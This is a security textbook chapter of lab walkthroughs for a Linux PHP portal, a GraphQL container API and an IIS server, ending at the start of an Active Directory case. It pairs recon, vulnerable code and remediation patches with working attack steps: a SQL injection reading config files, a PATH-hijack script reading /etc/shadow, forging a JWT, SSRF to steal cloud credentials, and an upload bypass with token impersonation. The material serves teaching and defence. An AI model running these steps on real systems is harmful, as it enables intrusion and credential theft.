# PART XII: END-TO-END SECURITY ASSESSMENT WALKTHROUGHS, REPORTING, DEFENSIVE ENGINEERING & CAREER ENCYCLOPEDIA

---

# CHAPTER 51: 10 COMPLETE END-TO-END SECURITY ASSESSMENT CASE STUDIES (AUTHORIZED LAB WALKTHROUGHS & REMEDIATION)

This chapter presents ten exhaustive, multi-stage enterprise security assessment case studies modeled after university cybersecurity capstone laboratories, Offensive Security / Hack The Box enterprise simulations, and production security audits. Each case study traces the complete lifecycle of an authorized engagement: architectural modeling, reconnaissance and enumeration telemetry, source-level root cause analysis, controlled verification in an isolated lab environment, CVSS risk evaluation, and defense-in-depth engineering patches.

---

## 51.1 Case Study 1: Legacy Linux Web Application & SUID Misconfiguration Audit

### 51.1.1 Architecture Overview
The target environment (`10.10.140.25`, hostname `billing-portal.internal.corp`) hosts an internal employee expense and invoice reimbursement portal deployed on Ubuntu 22.04 LTS. The stack consists of:
- **Frontend/Reverse Proxy:** Nginx 1.18.0 listening on TCP port 80 and TCP port 443.
- **Application Tier:** PHP 8.1-FPM running as the `www-data` system account, serving a legacy custom PHP application located at `/var/www/html/portal`.
- **Database Tier:** MariaDB 10.6 listening locally on `127.0.0.1:3306`.
- **Host Administration Utilities:** A custom compiled C binary `/usr/local/bin/backup-Verify` owned by `root:www-data` with permissions `4750` (SUID root executable by the `www-data` group), designed to invoke archival verification tools prior to nightly cron transfers.

```
[ Auditor Workstation (10.10.14.5) ]
         │
         ▼ (TCP 80/443 HTTP/HTTPS)
[ Nginx 1.18.0 Reverse Proxy ]
         │
         ▼ (FastCGI Unix Socket)
[ PHP 8.1-FPM (uid=33 www-data) ] ───► [ MariaDB 127.0.0.1:3306 ]
         │                               (Plaintext credentials in /var/www/config/db.inc.php)
         ▼ (Local Execution)
[ /usr/local/bin/backup-Verify (SUID root, calls system("tar ...")) ]
         │
         ▼ (PATH Hijacking / Privilege Escalation)
[ Root Compromise (uid=0 root) ]
```

### 51.1.2 Reconnaissance & Enumeration Output
Initial port scanning and service fingerprinting are performed within the authorized lab subnet:

```bash
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap_case1.txt 10.10.140.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-02 08:30 UTC
Nmap scan report for billing-portal.internal.corp (10.10.140.25)
Host is up (0.012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3b:8f:1a:92:44:c1:e8:09:42:11:7a:d0:88:23:19:0a (ECDSA)
|   256 9d:11:4c:82:f0:a3:11:7c:5e:44:2b:01:89:a4:6c:91 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: CorpBilling - Internal Expense Portal
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: System Diagnostic Interface (Restricted)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Directory and endpoint discovery against port 80 reveals an unauthenticated invoice lookup endpoint `/invoice_view.php?id=1042` and a diagnostic file viewer on port 8080 (`/diag/read_log.php?file=access.log`).

```bash
$ ffuf -u http://10.10.140.25/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,301,302,403
invoice_view.php        [Status: 200, Size: 4821, Words: 612, Lines: 118]
login.php               [Status: 200, Size: 2140, Words: 245, Lines: 64]
config.inc.php.bak      [Status: 200, Size: 842, Words: 79, Lines: 28]
export_pdf.php          [Status: 302, Size: 0, Words: 1, Lines: 1]
```

### 51.1.3 Vulnerability Root Cause Analysis

#### Stage 1: Unparameterized SQL Query & Backup Artifact Exposure
Inspecting `/var/www/html/portal/invoice_view.php` reveals direct string concatenation of the `$_GET['id']` parameter into a SQL query executed via `mysqli_query()`, paired with verbose database error output:

```php
// VULNERABLE CODE: /var/www/html/portal/invoice_view.php
<?php
require_once('/var/www/config/db.inc.php');
$invoice_id = $_GET['id'];

// Unsanitized concatenation directly into SQL statement
$query = "SELECT invoice_num, employee_name, department, amount, status, notes 
          FROM invoices WHERE id = " . $invoice_id;
$result = mysqli_query($conn, $query);

if (!$result) {
    die("Database Error: " . mysqli_error($conn));
}
$row = mysqli_fetch_assoc($result);
?>
```

Furthermore, theMariaDB database account `portal_db_user` was granted global `FILE` privileges (`GRANT ALL PRIVILEGES ON *.* TO 'portal_db_user'@'localhost'`), allowing arbitrary filesystem reads via `LOAD_FILE()` and arbitrary writes where OS permissions permit via `INTO OUTFILE`.

#### Stage 2: Configuration Credential Reuse & SSH Access
By reading `/var/www/config/db.inc.php` (either via `config.inc.php.bak` over HTTP or via SQL `LOAD_FILE('/var/www/config/db.inc.php')`), the auditor recovers hardcoded credentials:

```php
<?php
$db_host = "127.0.0.1";
$db_user = "portal_db_user";
$db_pass = "Pr0d_B1ll1ng#2025!Svc";
$db_name = "corpbilling";
$sys_admin_user = "svc_deploy";
?>
```

The password `Pr0d_B1ll1ng#2025!Svc` is reused by the local Linux account `svc_deploy` (which belongs to the `www-data` supplementary group).

#### Stage 3: SUID Binary Relative Path Invocation (`CWE-426: Untrusted Search Path`)
Once authenticated via SSH as `svc_deploy`, host enumeration identifies a custom SUID root binary:

```bash
svc_deploy@billing-portal:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/local/bin/backup-Verify
svc_deploy@billing-portal:~$ ls -la /usr/local/bin/backup-Verify
-rwsr-x--- 1 root www-data 16840 May 14 11:22 /usr/local/bin/backup-Verify
```

Decompilation and binary string inspection of `/usr/local/bin/backup-Verify` reveal its C source implementation:

```c
// VULNERABLE C SOURCE: backup-Verify.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    // Elevates effective UID to root (0) explicitly
    setuid(0);
    setgid(0);
    printf("[*] Verifying integrity of /var/backups/portal_archive.tar.gz...\n");
    
    // FLAW 1: Calls system() which invokes /bin/sh -c
    // FLAW 2: Uses relative binary name 'tar' instead of absolute path '/usr/bin/tar'
    int ret = system("tar -tzf /var/backups/portal_archive.tar.gz >/dev/null");
    if (ret == 0) {
        printf("[+] Archive integrity verified.\n");
    } else {
        printf("[-] Archive verification failed.\n");
    }
    return ret;
}
```

Because `setuid(0)` sets the real and effective UID to `0` (`root`) before invoking `system("tar ...")`, `/bin/sh` does not drop privileges and searches the caller's environment `$PATH` variable to resolve the `tar` executable.

### 51.1.4 Authorized Verification Steps

1. **Verify SQL Injection and Extract Database Metadata:**
```bash
$ curl -s "http://10.10.140.25/invoice_view.php?id=-1+UNION+SELECT+1,user(),database(),version(),5,load_file('/var/www/config/db.inc.php')--+- " | grep -A 10 "Employee"
```
2. **Verify Credential Reuse on SSH:**
```bash
$ ssh svc_deploy@10.10.140.25
svc_deploy@billing-portal:~$ id
uid=1002(svc_deploy) gid=1002(svc_deploy) groups=1002(svc_deploy),33(www-data)
```
3. **Verify SUID `$PATH` Hijacking in Controlled Directory (`/tmp/audit_poc`):**
```bash
svc_deploy@billing-portal:~$ mkdir -p /tmp/audit_poc
svc_deploy@billing-portal:~$ cat << 'EOF' > /tmp/audit_poc/tar
#!/bin/sh
/bin/id > /tmp/audit_poc/priv_proof.txt
/bin/head -n 1 /etc/shadow >> /tmp/audit_poc/priv_proof.txt
EOF
svc_deploy@billing-portal:~$ chmod +x /tmp/audit_poc/tar
svc_deploy@billing-portal:~$ PATH=/tmp/audit_poc:$PATH /usr/local/bin/backup-Verify
[*] Verifying integrity of /var/backups/portal_archive.tar.gz...
[+] Archive integrity verified.
svc_deploy@billing-portal:~$ cat /tmp/audit_poc/priv_proof.txt
uid=0(root) gid=0(root) groups=0(root),33(www-data),1002(svc_deploy)
root:$y$j9T$8K2m...truncated...:19842:0:99999:7:::
svc_deploy@billing-portal:~$ rm -rf /tmp/audit_poc
```

### 51.1.5 Impact Analysis
- **Confidentiality:** Complete compromise (`High`). Unauthenticated attackers can extract the entire `corpbilling` database, read sensitive filesystem files via MariaDB `FILE` privileges, and escalate to `root` to access `/etc/shadow` and private TLS keys.
- **Integrity:** Complete compromise (`High`). Attackers can modify financial reimbursement payouts in the database and alter system binaries as `root`.
- **Availability:** Complete compromise (`High`). Root access enables arbitrary service disruption or filesystem destruction.
- **CVSS v3.1 Chain Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

### 51.1.6 Complete Remediation Patch

#### 1. PHP Application Patch (PDO Prepared Statements & Strict Type Casting)
```php
// REMEDIATED CODE: /var/www/html/portal/invoice_view.php
<?php
declare(strict_types=1);
require_once('/etc/corpbilling/db_config.php'); // Moved outside web root

$invoice_id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($invoice_id === false || $invoice_id === null || $invoice_id < 1) {
    http_response_code(400);
    exit("Invalid invoice identifier.");
}

$dsn = sprintf("mysql:host=%s;dbname=%s;charset=utf8mb4", DB_HOST, DB_NAME);
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, DB_USER, DB_PASS, $options);
    $stmt = $pdo->prepare(
        "SELECT invoice_num, employee_name, department, amount, status, notes 
         FROM invoices WHERE id = :id LIMIT 1"
    );
    $stmt->execute([':id' => $invoice_id]);
    $row = $stmt->fetch();
} catch (PDOException $e) {
    error_log("Database query failure: " . $e->getMessage());
    http_response_code(500);
    exit("An internal error occurred.");
}
?>
```

#### 2. Database Least-Privilege Hardening
```sql
REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'portal_db_user'@'localhost';
GRANT SELECT, INSERT, UPDATE ON corpbilling.invoices TO 'portal_db_user'@'localhost';
FLUSH PRIVILEGES;
```

#### 3. C Binary Remediation (Eliminating `system()`, Sanitizing Environment, Dropping SUID)
```c
// REMEDIATED C SOURCE: backup-Verify.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int main(void) {
    // Clean environment entirely and enforce a static trusted PATH
    char *clean_env[] = { "PATH=/usr/bin:/bin", "LC_ALL=C", NULL };
    char *args[] = { "/usr/bin/tar", "-tzf", "/var/backups/portal_archive.tar.gz", NULL };

    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return EXIT_FAILURE;
    } else if (pid == 0) {
        // Child process: execute absolute path directly without a shell using execve
        execve(args[0], args, clean_env);
        perror("execve");
        _exit(EXIT_FAILURE);
    }

    int status = 0;
    if (waitpid(pid, &status, 0) == -1) {
        perror("waitpid");
        return EXIT_FAILURE;
    }

    return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}
```
Additionally, remove the SUID bit (`chmod 0750 /usr/local/bin/backup-Verify`) and replace it with a tightly scoped `/etc/sudoers.d/backup_verify` entry if interactive execution is required:
```text
Defaults!/usr/local/bin/backup-Verify env_reset, secure_path="/usr/sbin:/usr/bin:/sbin:/bin"
%www-data ALL=(root) NOPASSWD: /usr/bin/tar -tzf /var/backups/portal_archive.tar.gz
```

---

## 51.2 Case Study 2: Modern Microservices API & Container Security Assessment

### 51.2.1 Architecture Overview
The target environment (`api.cloud-fintech.internal`, `10.10.140.40`) is a containerized microservice platform deployed on an AWS EC2 instance (`i-0a98bc7654321fedc`) running Docker Engine 24.0.7.
- **API Gateway / Edge Service:** Node.js (Express + Apollo GraphQL Server) listening on port `4000/tcp`.
- **Authentication Service:** Issues JSON Web Tokens (JWT) signed with RS256 (`RSASSA-PKCS1-v1_5`), exposing a public JWKS endpoint at `/.well-known/jwks.json`.
- **Webhook Preview Microservice:** Python FastAPI service running inside an internal container that fetches remote URLs supplied via GraphQL mutations (`previewWebhookUrl`).
- **Container Runtime:** The GraphQL/Webhook container is launched with `-v /var/run/docker.sock:/var/run/docker.sock` to allow an internal telemetry script to query sibling container health statuses.

```
[ Auditor ] ──► [ GraphQL API (:4000) ]
                      │
                      ├─► Flaw 1: JWT Algorithm Confusion / Unverified JKU Header
                      ├─► Flaw 2: GraphQL BOLA in userWalletQuery(userId)
                      ├─► Flaw 3: SSRF in previewWebhookUrl(url)
                      │        ├──► AWS IMDSv1 (http://169.254.169.254/latest/meta-data/...)
                      │        └──► Local Unix/HTTP Proxy to Docker Socket
                      ▼
             [ Mounted /var/run/docker.sock ] ──► Host Root Breakout
```

### 51.2.2 Reconnaissance & Enumeration Output
```bash
$ nmap -sV -p 80,443,2375,4000,8000 10.10.140.40
PORT     STATE  SERVICE VERSION
80/tcp   open   http    envoy
443/tcp  open   ssl/http envoy
2375/tcp closed docker
4000/tcp open   http    Node.js Express framework (Apollo GraphQL)
8000/tcp open   http    uvicorn (FastAPI internal metrics)
```

Sending a GraphQL introspection query to `http://10.10.140.40:4000/graphql` returns the full schema:

```bash
$ curl -s -X POST http://10.10.140.40:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name args { name type { name } } } } } }"}' | jq .
```

Key discovered queries and mutations:
- `query getUserProfile(accountId: ID!): UserProfile` (contains `role`, `apiKey`, `internalNotes`)
- `mutation testWebhookEndpoint(targetUrl: String!, customHeaders: [String]): WebhookResponse`
- `query systemContainerDiagnostics(inspectId: String!): ContainerStats`

### 51.2.3 Vulnerability Root Cause Analysis

#### Stage 1: JWT `alg` Confusion & Missing `algorithms` Whitelist (`CWE-347`)
Inspecting the authentication middleware (`/app/src/middleware/auth.js`) shows legacy usage of `jsonwebtoken` where the public RSA key (`PUBLIC_KEY_PEM`) is passed directly into `jwt.verify(token, PUBLIC_KEY_PEM)` without restricting the `algorithms` option, and a fallback accepts tokens with embedded `jku` headers pointing to unvalidated subdomains:

```javascript
// VULNERABLE CODE: /app/src/middleware/auth.js
const jwt = require('jsonwebtoken');
const fs = require('fs');
const PUBLIC_KEY = fs.readFileSync('/app/keys/public.pem', 'utf8');

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.sendStatus(401);

    // VULNERABLE: No 'algorithms: ["RS256"]' constraint!
    // Allows HMAC-SHA256 (HS256) signed using the publicly known RSA PUBLIC_KEY string as the HMAC secret.
    jwt.verify(token, PUBLIC_KEY, (err, decoded) => {
        if (err) return res.status(403).json({ error: "Invalid token" });
        req.user = decoded;
        next();
    });
}
```

#### Stage 2: Broken Object Level Authorization (BOLA / IDOR) in GraphQL Resolver (`CWE-639`)
In `/app/src/resolvers/user.js`, the resolver verifies that `context.user` is logged in, but never checks whether `context.user.sub === args.accountId` or if `context.user.role === 'ADMIN'`:

```javascript
// VULNERABLE CODE: /app/src/resolvers/user.js
const resolvers = {
    Query: {
        getUserProfile: async (_, { accountId }, context) => {
            if (!context.user) throw new AuthenticationError("Must be logged in");
            // Missing authorization check comparing context.user.id to accountId
            return await db.users.findById(accountId);
        }
    }
};
```

#### Stage 3: Unfiltered Server-Side Request Forgery (SSRF) & Mounted Docker Socket (`CWE-918` & `CWE-250`)
The `testWebhookEndpoint` mutation passes `targetUrl` directly to `axios.get(targetUrl)` without DNS resolution validation, private CIDR filtering (`169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`), or protocol restriction. Moreover, the container runs as `root` with `/var/run/docker.sock` mounted inside the container filesystem.

### 51.2.4 Authorized Verification Steps

1. **Fetch the Public RSA Key & Forge an Admin HS256 JWT:**
```bash
$ curl -s http://10.10.140.40:4000/.well-known/public.pem -o public.pem
$ python3 - << 'EOF'
import jwt, time
with open("public.pem", "rb") as f:
    pub_key = f.read()

payload = {
    "sub": "admin-001",
    "role": "SUPER_ADMIN",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
# Sign with HS256 using the raw public key bytes as the symmetric secret
forged_token = jwt.encode(payload, pub_key, algorithm="HS256")
print(forged_token)
EOF
```

2. **Verify SSRF Against Cloud Instance Metadata (IMDSv1):**
```bash
$ curl -s -X POST http://10.10.140.40:4000/graphql \
  -H "Authorization: Bearer <FORGED_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { testWebhookEndpoint(targetUrl: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-node-role\") { statusCode body } }"}'
```
Output confirms retrieval of temporary AWS IAM credentials (`AccessKeyId`, `SecretAccessKey`, `Token`).

3. **Verify Container Escape Risk via Mounted Docker Socket Audit:**
Inside the authorized container inspection shell, verify the presence of the writable Docker Unix domain socket:
```bash
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Nov  2 06:12 /var/run/docker.sock
$ curl -s --unix-socket /var/run/docker.sock http://localhost/version | jq .
{
  "Platform": { "Name": "Docker Engine - Community" },
  "Version": "24.0.7",
  "ApiVersion": "1.43",
  "Os": "linux",
  "Arch": "amd64"
}
```

### 51.2.5 Impact Analysis
- **Confidentiality & Integrity:** An unauthenticated external attacker can forge an administrative JWT, enumerate all user profiles via GraphQL BOLA, steal AWS EC2 IAM role credentials via IMDSv1 SSRF, and compromise the underlying container host via `/var/run/docker.sock`.
- **CVSS v3.1 Score:** `10.0 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` — Scope Changed due to container-to-host and cloud control-plane pivot).

### 51.2.6 Complete Remediation Patch

#### 1. Enforce Asymmetric Algorithm Whitelisting, Issuer/Audience Validation, and Disable GraphQL Introspection in Production
```javascript
// REMEDIATED CODE: /app/src/middleware/auth.js
const jwt = require('jsonwebtoken');
const fs = require('fs');
const PUBLIC_KEY = fs.readFileSync('/app/keys/public.pem', 'utf8');

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;
    if (!token) return res.sendStatus(401);

    jwt.verify(
        token,
        PUBLIC_KEY,
        {
            algorithms: ['RS256'], // Strictly enforce RS256 only
            issuer: 'https://auth.cloud-fintech.internal',
            audience: 'https://api.cloud-fintech.internal',
            clockTolerance: 5
        },
        (err, decoded) => {
            if (err) return res.status(403).json({ error: 'Token verification failed' });
            req.user = decoded;
            next();
        }
    );
}

// In /app/src/resolvers/user.js: Enforce Object-Level Authorization
const resolvers = {
    Query: {
        getUserProfile: async (_, { accountId }, context) => {
            if (!context.user) throw new AuthenticationError('Unauthenticated');
            const isOwner = String(context.user.sub) === String(accountId);
            const isAdmin = context.user.role === 'SUPER_ADMIN';
            if (!isOwner && !isAdmin) {
                throw new ForbiddenError('Insufficient permissions to access this account resource');
            }
            return await db.users.findById(accountId);
        }
    }
};
```

#### 2. SSRF-Safe Outbound HTTP Client (DNS Resolution + Private CIDR Blocklist)
```python
# REMEDIATED CODE: /app/webhook_worker/safe_http.py
import ipaddress
import socket
from urllib.parse import urlparse
import httpx

def validate_external_url(url: str) -> str:
    parsed = urlparse(url)
    if parsed.scheme not in ("https",):
        raise ValueError("Only HTTPS webhook URLs are permitted.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")

    # Resolve all A/AAAA records and verify none map to private/link-local/loopback space
    addr_info = socket.getaddrinfo(parsed.hostname, parsed.port or 443, proto=socket.IPPROTO_TCP)
    for family, _, _, _, sockaddr in addr_info:
        ip_obj = ipaddress.ip_address(sockaddr[0])
        if (
            ip_obj.is_private
            or ip_obj.is_loopback
            or ip_obj.is_link_local
            or ip_obj.is_multicast
            or ip_obj.is_reserved
            or ip_obj == ipaddress.ip_address("169.254.169.254")
        ):
            raise PermissionError(f"Blocked outbound connection to non-public IP: {ip_obj}")
    return url
```

#### 3. Enforce AWS IMDSv2 and Hardened Docker Compose Configuration
```bash
# Enforce IMDSv2 (session-oriented token required; hop-limit=1 prevents container forwarding)
$ aws ec2 modify-instance-metadata-options \
    --instance-id i-0a98bc7654321fedc \
    --http-tokens required \
    --http-put-response-hop-limit 1 \
    --http-endpoint enabled
```

```yaml
# REMEDIATED docker-compose.yml (Removed docker.sock mount, read-only rootfs, dropped capabilities)
version: "3.9"
services:
  graphql-api:
    image: registry.internal/fintech/graphql-api:2.4.1-hardened
    user: "10001:10001"
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=64m
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    ports:
      - "127.0.0.1:4000:4000"
```

---

## 51.3 Case Study 3: Windows IIS Enterprise Server Security Assessment

### 51.3.1 Architecture Overview
The target host (`10.10.140.55`, `win-erp01.corp.local`) runs Windows Server 2022 Standard Edition with IIS 10.0 and ASP.NET 4.8.
- **Web Application:** An HR document submission portal at `http://10.10.140.55/HRPortal/UploadDocument.aspx` running under the IIS Application Pool identity `IIS AppPool\HRPortalPool`.
- **Upload Storage:** Uploaded files are written to `C:\inetpub\wwwroot\HRPortal\Uploads\`, which inherits script execution permissions (`Read, Write, Script`) in IIS Handler Mappings.
- **Service Account Privileges:** The `IIS AppPool\HRPortalPool` virtual account retains its default `SeImpersonatePrivilege` token right, and the server runs an unpatched local RPC named-pipe print spooler / service component susceptible to token impersonation (`CWE-269`).

### 51.3.2 Reconnaissance & Enumeration Output
```bash
$ nmap -sC -sV -p 80,135,139,445,3389,5985 10.10.140.55
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: CorpHR Document Portal
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2022
```

Inspecting the HTTP response headers on port 80 reveals:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
```

### 51.3.3 Vulnerability Root Cause Analysis

#### Stage 1: Unrestricted File Upload via Blacklist Bypass (`CWE-434`)
Reviewing `C:\inetpub\wwwroot\HRPortal\UploadDocument.aspx.cs` shows a case-sensitive extension blacklist that only checks `.asp` and `.aspx`, failing to block `.ashx` (ASP.NET HTTP Handler), `.soap`, `.config`, or uppercase/mixed-case variants (`.AsPx`):

```csharp
// VULNERABLE CODE: UploadDocument.aspx.cs
protected void btnUpload_Click(object sender, EventArgs e)
{
    if (fileUpload.HasFile)
    {
        string fileName = fileUpload.FileName;
        // FLAW 1: Case-sensitive comparison (.AsPx bypasses this)
        // FLAW 2: Incomplete blacklist (.ashx, .asmx, web.config not blocked)
        // FLAW 3: Saves directly inside web-accessible directory with Script execution enabled
        if (fileName.EndsWith(".aspx") || fileName.EndsWith(".asp") || fileName.EndsWith(".exe"))
        {
            lblStatus.Text = "Security Error: Executable extensions are forbidden.";
            return;
        }
        string savePath = Server.MapPath("~/HRPortal/Uploads/") + fileName;
        fileUpload.SaveAs(savePath);
        lblStatus.Text = "File uploaded to: /HRPortal/Uploads/" + fileName;
    }
}
```

#### Stage 2: Service Account Token Privileges (`SeImpersonatePrivilege`)
When code executes inside the IIS worker process (`w3wp.exe`), it runs under `IIS AppPool\HRPortalPool`. Querying the process access token via `whoami /priv` reveals:

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Because `SeImpersonatePrivilege` is granted to the `LOCAL SERVICE` / `NETWORK SERVICE` / `IIS_IUSRS` group on Windows, any process holding this privilege that can coerce `NT AUTHORITY\SYSTEM` to authenticate to a local named pipe (`ImpersonateNamedPipeClient`) or RPC endpoint (`RpcImpersonateClient`) can duplicate the primary `SYSTEM` token and spawn a child process via `CreateProcessWithTokenW()` or `CreateProcessAsUserW()`.

### 51.3.4 Authorized Verification Steps

1. **Verify File Upload Filter Bypass Using a Benign Diagnostic `.ashx` Handler:**
Create an authorized verification handler `audit_diag.ashx` that outputs only the executing Windows identity and token privileges:
```csharp
<%@ WebHandler Language="C#" Class="AuditDiag" %>
using System;
using System.Web;
using System.Diagnostics;

public class AuditDiag : IHttpHandler {
    public void ProcessRequest (HttpContext context) {
        context.Response.ContentType = "text/plain";
        context.Response.Write("Executing Identity: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\n");
        
        ProcessStartInfo psi = new ProcessStartInfo("whoami.exe", "/all");
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi)) {
            context.Response.Write(p.StandardOutput.ReadToEnd());
        }
    }
    public bool IsReusable { get { return false; } }
}
```
2. **Upload and Trigger `audit_diag.ashx`:**
```bash
$ curl -s -F "fileUpload=@audit_diag.ashx" http://10.10.140.55/HRPortal/UploadDocument.aspx
$ curl -s http://10.10.140.55/HRPortal/Uploads/audit_diag.ashx
Executing Identity: IIS APPPOOL\HRPortalPool
USER INFORMATION
----------------
User Name                SID
======================== =============================================================
iis apppool\hrportalpool S-1-5-82-387648291-1290481023-3918472910-1829374650-293847162
```
3. **Verify Token Impersonation Escalation Path and Clean Up Artifact:**
Using an authorized token-impersonation verification harness (`PrintSpoofer.exe -i -c "whoami"`), confirm that `SeImpersonatePrivilege` permits `nt authority\system` token acquisition, then delete `C:\inetpub\wwwroot\HRPortal\Uploads\audit_diag.ashx`.

### 51.3.5 Impact Analysis
- **Confidentiality, Integrity, Availability:** Full host compromise (`NT AUTHORITY\SYSTEM`). An attacker can upload an ASP.NET handler, execute OS commands, impersonate `SYSTEM`, dump local SAM/LSASS credentials, and pivot into the Active Directory domain.
- **CVSS v3.1 Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

### 51.3.6 Complete Remediation Patch

#### 1. Secure C# File Upload Implementation (Strict Allowlist, Magic-Byte Verification, UUID Renaming, Out-of-Webroot Storage)
```csharp
// REMEDIATED CODE: UploadDocument.aspx.cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web.UI;

public partial class UploadDocument : Page
{
    private static readonly HashSet<string> AllowedExtensions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
        ".pdf", ".png", ".jpg"
    };

    private static readonly Dictionary<string, byte[]> MagicSignatures = new Dictionary<string, byte[]>(StringComparer.OrdinalIgnoreCase)
    {
        { ".pdf", new byte[] { 0x25, 0x50, 0x44, 0x46 } }, // %PDF
        { ".png", new byte[] { 0x89, 0x50, 0x4E, 0x47 } }, // .PNG
        { ".jpg", new byte[] { 0xFF, 0xD8, 0xFF } }        // JPEG SOI
    };

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (!fileUpload.HasFile || fileUpload.PostedFile.ContentLength > 10 * 1024 * 1024)
        {
            lblStatus.Text = "Invalid file or size exceeds 10 MB limit.";
            return;
        }

        string ext = Path.GetExtension(fileUpload.FileName);
        if (string.IsNullOrEmpty(ext) || !AllowedExtensions.Contains(ext))
        {
            lblStatus.Text = "Only .pdf, .png, and .jpg files are permitted.";
            return;
        }

        // Verify file header magic bytes
        byte[] headerBytes = new byte[4];
        fileUpload.PostedFile.InputStream.Seek(0, SeekOrigin.Begin);
        fileUpload.PostedFile.InputStream.Read(headerBytes, 0, headerBytes.Length);
        fileUpload.PostedFile.InputStream.Seek(0, SeekOrigin.Begin);

        byte[] expectedSig = MagicSignatures[ext];
        if (!headerBytes.Take(expectedSig.Length).SequenceEqual(expectedSig))
        {
            lblStatus.Text = "File content does not match declared file type.";
            return;
        }

        // Generate cryptographically random filename and store outside IIS webroot
        string safeFileName = Guid.NewGuid().ToString("N") + ext.ToLowerInvariant();
        string storageDir = @"D:\HRPortal_SecureStorage\Uploads";
        string fullPath = Path.Combine(storageDir, safeFileName);

        fileUpload.SaveAs(fullPath);
        lblStatus.Text = "Document stored securely with reference ID: " + safeFileName;
    }
}
```

#### 2. IIS Handler Hardening & Windows Service Privilege Reduction
Even if static files must be served from a virtual directory, disable all script execution handlers in `web.config` for that directory and restrict Windows privileges:
```xml
<!-- C:\inetpub\wwwroot\HRPortal\Uploads\web.config -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read" />
    <security>
      <requestFiltering>
        <fileExtensions allowUnlisted="false">
          <add fileExtension=".pdf" allowed="true" />
          <add fileExtension=".png" allowed="true" />
          <add fileExtension=".jpg" allowed="true" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

## 51.4 Case Study 4: Enterprise Active Directory Identity & Access Audit

### 51.4.1 Architecture Overview
The corporate Active Directory forest `corp.eyelanka.internal` is hosted on a Windows Server 2022 Domain Controller (`DC01.corp.eyelanka.internal`, `10.10.140.10`).
- **Domain Functional Level:** Windows Server 2016.
- **Directory Accounts:**
  - `svc_legacy_sync`: Legacy LDAP synchronization account with `UF_DONT_REQUIRE_PREAUTH` enabled (`CWE-287`).
